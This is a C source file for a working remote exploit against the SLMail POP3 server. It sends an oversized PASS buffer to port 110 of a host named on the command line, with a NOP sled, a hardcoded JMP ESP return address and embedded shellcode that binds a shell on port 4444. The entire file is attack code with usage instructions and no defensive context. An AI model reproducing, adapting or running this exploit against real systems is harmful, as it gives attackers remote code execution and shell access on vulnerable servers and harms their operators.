/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xb8\x1b\xf1\xf4\xf1\xda\xc6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x0e\x03\x58\xff\x16\x04\xa2\x17\x54"
"\xe7\x5a\xe8\x39\x61\xbf\xd9\x79\x15\xb4\x4a\x4a\x5d\x98\x66"
"\x21\x33\x08\xfc\x47\x9c\x3f\xb5\xe2\xfa\x0e\x46\x5e\x3e\x11"
"\xc4\x9d\x13\xf1\xf5\x6d\x66\xf0\x32\x93\x8b\xa0\xeb\xdf\x3e"
"\x54\x9f\xaa\x82\xdf\xd3\x3b\x83\x3c\xa3\x3a\xa2\x93\xbf\x64"
"\x64\x12\x13\x1d\x2d\x0c\x70\x18\xe7\xa7\x42\xd6\xf6\x61\x9b"
"\x17\x54\x4c\x13\xea\xa4\x89\x94\x15\xd3\xe3\xe6\xa8\xe4\x30"
"\x94\x76\x60\xa2\x3e\xfc\xd2\x0e\xbe\xd1\x85\xc5\xcc\x9e\xc2"
"\x81\xd0\x21\x06\xba\xed\xaa\xa9\x6c\x64\xe8\x8d\xa8\x2c\xaa"
"\xac\xe9\x88\x1d\xd0\xe9\x72\xc1\x74\x62\x9e\x16\x05\x29\xf7"
"\xdb\x24\xd1\x07\x74\x3e\xa2\x35\xdb\x94\x2c\x76\x94\x32\xab"
"\x79\x8f\x83\x23\x84\x30\xf4\x6a\x43\x64\xa4\x04\x62\x05\x2f"
"\xd4\x8b\xd0\xe0\x84\x23\x8b\x40\x74\x84\x7b\x29\x9e\x0b\xa3"
"\x49\xa1\xc1\xcc\xe0\x58\x82\xf8\xff\x62\x6b\x95\xfd\x62\x8a"
"\xde\x8b\x84\xe6\x30\xda\x1f\x9f\xa9\x47\xeb\x3e\x35\x52\x96"
"\x01\xbd\x51\x67\xcf\x36\x1f\x7b\xb8\xb6\x6a\x21\x6f\xc8\x40"
"\x4d\xf3\x5b\x0f\x8d\x7a\x40\x98\xda\x2b\xb6\xd1\x8e\xc1\xe1"
"\x4b\xac\x1b\x77\xb3\x74\xc0\x44\x3a\x75\x85\xf1\x18\x65\x53"
"\xf9\x24\xd1\x0b\xac\xf2\x8f\xed\x06\xb5\x79\xa4\xf5\x1f\xed"
"\x31\x36\xa0\x6b\x3e\x13\x56\x93\x8f\xca\x2f\xac\x20\x9b\xa7"
"\xd5\x5c\x3b\x47\x0c\xe5\x5b\xaa\x84\x10\xf4\x73\x4d\x99\x99"
"\x83\xb8\xde\xa7\x07\x48\x9f\x53\x17\x39\x9a\x18\x9f\xd2\xd6"
"\x31\x4a\xd4\x45\x31\x5f";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[2977];
      char buf[3500];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3500);
      memset(evil, 0x00, 2977);
      memset(evil, 0x41, 2606);
      ptr = &evil;
      ptr = ptr + 2610; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 16;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2607] = 0x5f4a358f; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
